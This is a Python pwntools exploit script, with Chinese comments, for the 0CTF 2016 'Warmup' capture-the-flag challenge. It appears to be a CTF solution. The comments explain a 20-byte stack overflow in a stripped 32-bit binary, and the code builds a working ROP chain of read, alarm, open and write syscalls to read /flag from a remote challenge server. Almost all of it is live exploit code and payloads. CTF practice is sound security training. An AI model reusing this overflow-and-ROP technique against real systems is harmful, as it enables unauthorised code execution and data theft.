from pwn import *

# 0CTF 2016 Warmup - ORW via alarm-controlled eax
#
# 程序信息:
#   - 32-bit i386, 静态链接, stripped
#   - NX 启用 (栈不可执行)
#   - 通过 int 0x80 直接做系统调用 (无 libc)
#   - 溢出 20 字节 = 5 个 DWORD (ret + 4 参数)
#
# 漏洞:
#   vuln 函数: sub 0x30 esp; read(0, esp+0x10, 0x34); write(...); 清寄存器; ret
#   buf 只有 0x20 字节，read 读 0x34 字节 -> 溢出 0x14 = 20 字节
#
# 利用思路 (alarm 控制 eax + ORW):
#   1. sys_read 把 "/flag" 写到 .data 段
#   2. _start 中 alarm(10) 已执行，sleep(5) 后剩余 5 秒
#   3. 再次调用 alarm(seconds) -> eax = 返回值 = 5 = SYS_open
#   4. 跳到 syscall gadget: ebx="/flag", ecx=0, edx=0 -> open("/flag", 0)
#   5. read(3, buf, N) 读取 flag
#   6. write(1, buf, N) 输出 flag

context.arch = 'i386'
context.log_level = 'info'

# 地址
read_addr   = 0x804811D   # sys_read:  eax=3, 栈取 fd/buf/count
write_addr  = 0x8048135   # sys_write: eax=4, 栈取 fd/buf/count
alarm_addr  = 0x804810D   # sys_alarm: eax=0x1b, 栈取 seconds
main_addr   = 0x804815A   # vuln 函数入口 (重新触发)
data_addr   = 0x80491BC   # .data 段可写地址
data2_addr  = data_addr + 0x30
syscall_g   = 0x8048122   # mov 0x4(%esp),%ebx; mov 0x8(%esp),%ecx;
                          # mov 0xc(%esp),%edx; int $0x80; test; js; ret

LOCAL = False

if LOCAL:
    io = process('./warmup_bin', env={})
    flag_path = b'/tmp/flag\x00'
else:
    io = remote("1b4f6f0c190148dd15a43552.tcp-ctf2.dasctf.com", 9999, ssl=True)
    flag_path = b'/flag\x00'

io.recv(timeout=2)  # Welcome

# Step 1: 写 flag 路径到 .data
payload  = b'A' * 0x20
payload += p32(read_addr) + p32(main_addr) + p32(0) + p32(data_addr) + p32(0x10)
io.send(payload)
io.recvuntil(b'Good Luck!\n')
io.send(flag_path.ljust(0x10, b'\x00'))

# Step 2: alarm 返回值设 eax=5 (SYS_open), 然后 open("/flag", 0)
import time; time.sleep(5)
payload  = b'A' * 0x20
payload += p32(alarm_addr) + p32(syscall_g) + p32(main_addr) + p32(data_addr) + p32(0)
io.send(payload)
io.recvuntil(b'Good Luck!\n')

# Step 3: read(fd=3, data2, 0x30)
payload  = b'A' * 0x20
payload += p32(read_addr) + p32(main_addr) + p32(3) + p32(data2_addr) + p32(0x30)
io.send(payload)
io.recvuntil(b'Good Luck!\n')

# Step 4: write(1, data2, 0x30)
payload  = b'A' * 0x20
payload += p32(write_addr) + p32(main_addr) + p32(1) + p32(data2_addr) + p32(0x30)
io.send(payload)

try:
    data = io.recv(timeout=3)
    print(f"Flag: {data}")
except:
    print("No flag received")

io.interactive()
